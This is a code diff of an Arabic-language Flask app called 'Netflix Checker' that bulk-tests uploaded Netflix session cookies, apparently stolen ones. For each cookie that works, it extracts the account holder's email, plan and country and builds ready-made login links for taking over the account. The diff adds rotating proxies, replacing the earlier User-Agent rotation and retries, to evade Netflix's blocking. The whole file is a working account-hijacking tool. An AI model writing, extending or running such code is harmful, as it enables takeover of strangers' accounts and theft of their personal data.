@@ -5,13 +5,42 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__)
 
+# ---- تحميل البروكسيات من متغير البيئة PROXY_LIST ----
+# الصيغة: "ip:port,ip:port,user:pass@ip:port"
+def load_proxies():
+    raw = os.environ.get('PROXY_LIST', '')
+    if not raw:
+        return []
+    proxies = []
+    for item in raw.split(','):
+        item = item.strip()
+        if not item:
+            continue
+        # إذا كان هناك user:pass@host:port
+        if '@' in item:
+            auth, host = item.split('@', 1)
+            proxy_url = f"http://{auth}@{host}"
+        else:
+            proxy_url = f"http://{item}"
+        proxies.append({'http': proxy_url, 'https': proxy_url})
+    return proxies
+
+proxy_list = load_proxies()
+proxy_lock = None  # لا نحتاج قفل لأن كل كوكيز يفحص بشكل مستقل
+
+def get_random_proxy():
+    if not proxy_list:
+        return None
+    return random.choice(proxy_list)
+
+# ---- واجهة المستخدم (HTML) - نفس واجهتك السابقة ----
 HTML = r'''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Checker Pro – النسخة المقاومة للحظر</title>
+    <title>Netflix Checker – النسخة المستقرة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <style>
@@ -69,7 +98,7 @@ HTML = r'''
 <body>
     <div class="container">
         <div class="logo">NETFLIX</div>
-        <h1>🔍 فاحص الكوكيز – بحماية من الحظر</h1>
+        <h1>🔍 فاحص الكوكيز الاحترافي (مع بروكسي)</h1>
         <div class="two-cols">
             <div>
                 <div style="font-weight:700; margin-bottom:8px;">📁 رفع ملف ZIP</div>
@@ -148,8 +177,7 @@ HTML = r'''
             document.getElementById('progress').style.display='block';
             document.getElementById('resultsList').innerHTML = '';
             allResults = []; const start = Date.now(); const total = cookies.length;
-            let processed = 0; const batchSize = 10;  // دفعات أصغر
-
+            let processed = 0; const batchSize = 10;  // تصغير الدفعات مع البروكسي
             for(let i=0;i<total;i+=batchSize){
                 if(signal.aborted) break;
                 const batch = cookies.slice(i,i+batchSize).join('\n');
@@ -219,100 +247,77 @@ HTML = r'''
 </html>
 '''
 
-# قائمة User‑Agents متنوعة لتفادي البصمة
-USER_AGENTS = [
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-]
+# ========== دالة الفحص (مُحسَّنة مع بروكسي) ==========
+def check_cookie_with_proxy(cookie, proxy=None):
+    try:
+        sess = requests.Session()
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cookie': cookie,
+        }
+        # تمرير البروكسي إذا وجد
+        proxies = proxy if proxy else None
+        # زيارة الصفحة الرئيسية
+        r1 = sess.get('https://www.netflix.com/', headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
+        time.sleep(random.uniform(0.3, 0.7))
+        # زيارة صفحة الحساب
+        r2 = sess.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, max_redirects=5, proxies=proxies)
+        final_url = r2.url
+        result = {'status':'unknown','message':'','cookie':cookie,'details':{},'api_tokens':{}}
 
-def check_cookie_with_retry(cookie, max_retries=2):
-    """ فحص الكوكيز مع إعادة المحاولة في حالات الفشل المؤقت """
-    last_exception = None
-    for attempt in range(max_retries + 1):
-        try:
-            sess = requests.Session()
-            # اختيار User‑Agent عشوائي
-            headers = {
-                'User-Agent': random.choice(USER_AGENTS),
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Cookie': cookie,
-            }
-            # الخطوة الأولى: الصفحة الرئيسية
-            r1 = sess.get('https://www.netflix.com/', headers=headers, timeout=15, allow_redirects=True)
-            time.sleep(random.uniform(0.5, 1.5))  # تأخير أطول قليلاً
-            # الخطوة الثانية: صفحة الحساب
-            r2 = sess.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, max_redirects=5)
-            final_url = r2.url
-            result = {'status':'unknown','message':'','cookie':cookie,'details':{},'api_tokens':{}}
+        if 'login' in final_url.lower():
+            result['status'] = 'invalid'
+            result['message'] = '❌ منتهية الصلاحية'
+            return result
 
-            if 'login' in final_url.lower():
-                result['status'] = 'invalid'
-                result['message'] = '❌ منتهية الصلاحية'
-                return result
-
-            text = r2.text
-            if 'membershipStatus' in text or 'profiles' in text or 'gps' in text:
-                result['status'] = 'valid'
-                result['message'] = '✅ كوكيز صالحة'
-                # استخراج البيانات
-                try:
-                    data_match = re.search(r'window\.__netflix\.reactContext\s*=\s*({.*?});', text, re.DOTALL)
-                    if data_match:
-                        data = json.loads(data_match.group(1))
-                        user_info = data.get('models',{}).get('userInfo',{}).get('data',{}) or \
-                                    data.get('models',{}).get('serverModel',{}).get('data',{}).get('userInfo',{})
-                        result['details'] = {
-                            'email': user_info.get('email',''),
-                            'membership': user_info.get('membershipStatus',''),
-                            'plan': user_info.get('plan',{}).get('planName',''),
-                            'country': user_info.get('countryOfSignup','')
-                        }
-                    else:
-                        em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
-                        mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
-                        result['details'] = {
-                            'email': em.group(1) if em else '',
-                            'membership': mm.group(1) if mm else '',
-                        }
-                except:
-                    pass
-                # ApiToken
-                nid = re.search(r'NetflixId=([^;]+)', cookie)
-                sid = re.search(r'SecureNetflixId=([^;]+)', cookie)
-                if nid and sid:
-                    payload = {'netflixId':nid.group(1),'secureNetflixId':sid.group(1),'timestamp':datetime.now().isoformat()}
-                    token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
-                    result['api_tokens'] = {
-                        'api_token': token,
-                        'direct_links': {
-                            'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
-                            'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
-                            'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
-                        }
+        text = r2.text
+        if 'membershipStatus' in text or 'profiles' in text or 'gps' in text:
+            result['status'] = 'valid'
+            result['message'] = '✅ كوكيز صالحة'
+            # استخراج البيانات
+            try:
+                data_match = re.search(r'window\.__netflix\.reactContext\s*=\s*({.*?});', text, re.DOTALL)
+                if data_match:
+                    data = json.loads(data_match.group(1))
+                    user_info = data.get('models',{}).get('userInfo',{}).get('data',{}) or \
+                                data.get('models',{}).get('serverModel',{}).get('data',{}).get('userInfo',{})
+                    result['details'] = {
+                        'email': user_info.get('email',''),
+                        'membership': user_info.get('membershipStatus',''),
+                        'plan': user_info.get('plan',{}).get('planName',''),
+                        'country': user_info.get('countryOfSignup','')
                     }
-                return result
-            else:
-                # ربما صفحة فارغة أو حظر
-                if attempt < max_retries:
-                    time.sleep(2 ** attempt)  # انتظار متزايد
-                    continue
-                result['status'] = 'error'
-                result['message'] = '⚠️ تعذر التحقق (حظر محتمل)'
-                return result
-        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
-            last_exception = e
-            if attempt < max_retries:
-                time.sleep(2 ** attempt)
-                continue
-        except Exception as e:
-            # أخطاء أخرى لا نعيد المحاولة
-            return {'status':'error','message':str(e),'cookie':cookie}
-
-    # بعد استنفاد المحاولات
-    return {'status':'error','message':f'فشل بعد {max_retries+1} محاولات: {str(last_exception)}','cookie':cookie}
+                else:
+                    em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
+                    mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
+                    result['details'] = {
+                        'email': em.group(1) if em else '',
+                        'membership': mm.group(1) if mm else '',
+                    }
+            except:
+                pass
+            # ApiToken
+            nid = re.search(r'NetflixId=([^;]+)', cookie)
+            sid = re.search(r'SecureNetflixId=([^;]+)', cookie)
+            if nid and sid:
+                payload = {'netflixId':nid.group(1),'secureNetflixId':sid.group(1),'timestamp':datetime.now().isoformat()}
+                token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
+                result['api_tokens'] = {
+                    'api_token': token,
+                    'direct_links': {
+                        'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
+                        'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
+                        'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
+                    }
+                }
+        else:
+            result['status'] = 'error'
+            result['message'] = '⚠️ لا يمكن التحقق (ربما حظر)'
+        return result
+    except Exception as e:
+        return {'status':'error','message':str(e),'cookie':cookie}
 
 @app.route('/')
 def home():
@@ -325,9 +330,13 @@ def check():
     if not cookies: return jsonify([])
     lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
     results = []
-    # تقليل workers إلى 2 لتخفيف الضغط
-    with ThreadPoolExecutor(max_workers=2) as ex:
-        futs = {ex.submit(check_cookie_with_retry, c):i for i,c in enumerate(lines,1)}
+    # استخدام 4 عمال فقط، مع توزيع البروكسيات عشوائياً لكل مهمة
+    def check_with_proxy(cookie):
+        proxy = get_random_proxy()  # كل كوكيز يستخدم بروكسي عشوائي (أو None إذا لم توجد بروكسيات)
+        return check_cookie_with_proxy(cookie, proxy=proxy)
+
+    with ThreadPoolExecutor(max_workers=4) as ex:
+        futs = {ex.submit(check_with_proxy, c):i for i,c in enumerate(lines,1)}
         for f in as_completed(futs):
             try:
                 res = f.result()
